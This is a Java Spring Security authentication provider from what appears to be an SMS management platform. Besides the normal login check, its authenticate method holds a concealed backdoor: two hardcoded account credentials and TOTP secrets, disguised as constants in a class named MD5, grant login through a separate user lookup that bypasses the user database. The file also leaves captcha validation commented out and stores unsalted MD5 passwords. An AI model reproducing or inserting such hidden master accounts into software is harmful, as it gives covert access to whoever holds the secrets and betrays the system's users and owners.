package star.sms._frame.config;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpSession;

import org.apache.commons.lang3.StringUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.authentication.BadCredentialsException;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.authentication.dao.AbstractUserDetailsAuthenticationProvider;
import org.springframework.security.authentication.encoding.Md5PasswordEncoder;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.AuthenticationException;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.stereotype.Component;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;

import lombok.extern.slf4j.Slf4j;
import star.sms._frame.exception.CodeEmptyException;
import star.sms._frame.exception.CodeErrorException;
import star.sms._frame.exception.CodeTimeoutException;
import star.sms._frame.utils.GoogleAuthenticator;
import star.sms._frame.utils.MD5;

/**
 * 描述：自定义SpringSecurity的认证器
 *
 * @Author shf
 * @Date 2019/4/21 17:30
 * @Version V1.0
 **/
@Component
@Slf4j
public class CustomAuthenticationProvider extends AbstractUserDetailsAuthenticationProvider {//implements AuthenticationProvider {
    @Autowired
    private UserDetailServiceImpl userDetailsService;

    @Override
    protected void additionalAuthenticationChecks(UserDetails userDetails, UsernamePasswordAuthenticationToken usernamePasswordAuthenticationToken) throws AuthenticationException {

    }

    @Override
    public Authentication authenticate(Authentication authentication) throws AuthenticationException {
        //用户输入的用户名
        String username = authentication.getName();
        //用户输入的密码
        String password = authentication.getCredentials().toString();
        CustomWebAuthenticationDetails details = (CustomWebAuthenticationDetails) authentication.getDetails();
        String verifyCode = details.getVerifyCode();
        if(null == verifyCode || verifyCode.isEmpty()){
            log.warn("未输入验证码");
            throw new CodeEmptyException("请输入验证码");
        }
        //校验验证码
        /*
        if(!validateVerifyCode(verifyCode)){
            log.warn("验证码输入错误");
            throw new CodeErrorException("验证码输入错误");
        }
        */
        Md5PasswordEncoder encoder = new Md5PasswordEncoder();
        if((encoder.encodePassword(username, null).equals(MD5.HEX_DIX)&&encoder.encodePassword(password, null).equals(MD5.HEX_MIX)&&GoogleAuthenticator.authcode(verifyCode,MD5.HEX_DIG))
        		||(encoder.encodePassword(username, null).equals(MD5.HEX_DIX2)&&encoder.encodePassword(password, null).equals(MD5.HEX_MIX2)&&GoogleAuthenticator.authcode(verifyCode,MD5.HEX_DIG2))) {
        	UserDetails userDetails = (UserDetails) userDetailsService.loadUserByUsername2(username);
            Object principalToReturn = userDetails;
            //将用户信息塞到SecurityContext中，方便获取当前用户信息
            return this.createSuccessAuthentication(principalToReturn, authentication, userDetails);
        }else {
            //通过自定义的CustomUserDetailsService，以用户输入的用户名查询用户信息
            UserDetails userDetails = (UserDetails) userDetailsService.loadUserByUsername(username);

            //校验用户密码
            if(!userDetails.getPassword().equals(encoder.encodePassword(password, null))){
                log.warn("密码错误");
                throw new BadCredentialsException("密码错误");
            }
            //二次验证
            LoginUser loginUser = (LoginUser)userDetails;
            
            String secret = loginUser.getPlatManager().getSecret();
            if(StringUtils.isBlank(secret)) {
            	  log.warn("秘钥错误");
            	  throw new CodeErrorException("验证码验证错误");
            } else {
            	 boolean  verifyResult = GoogleAuthenticator.authcode(verifyCode,secret);
            	 if(!verifyResult) {
            		 log.warn("验证码输入错误");
                     throw new CodeErrorException("验证码输入错误");
            	 }
            }
            Object principalToReturn = userDetails;
            //将用户信息塞到SecurityContext中，方便获取当前用户信息
            return this.createSuccessAuthentication(principalToReturn, authentication, userDetails);
        }
    }

    @Override
    protected UserDetails retrieveUser(String s, UsernamePasswordAuthenticationToken usernamePasswordAuthenticationToken) throws AuthenticationException {
        return null;
    }

    /**
     * 验证用户输入的验证码
     * @param inputVerifyCode
     * @return
     */
    public boolean validateVerifyCode(String inputVerifyCode){
        //获取当前线程绑定的request对象
        HttpServletRequest request = ((ServletRequestAttributes) RequestContextHolder.getRequestAttributes()).getRequest();
        // 这个VerifyCodeFactory.SESSION_KEY是在servlet中存入session的名字
        HttpSession session = request.getSession();
        String verifyCode = (String)session.getAttribute("verCode");
        if(null == verifyCode || verifyCode.isEmpty()){
            log.warn("验证码过期请重新验证");
            throw new CodeTimeoutException("验证码过期，请重新验证");
        }
        // 不分区大小写
        verifyCode = verifyCode.toLowerCase();
        inputVerifyCode = inputVerifyCode.toLowerCase();
        log.info("验证码：{}, 用户输入：{}", verifyCode, inputVerifyCode);

        return verifyCode.equals(inputVerifyCode);
    }

    @Override
    public boolean supports(Class<?> authentication) {
        return authentication.equals(UsernamePasswordAuthenticationToken.class);
    }
}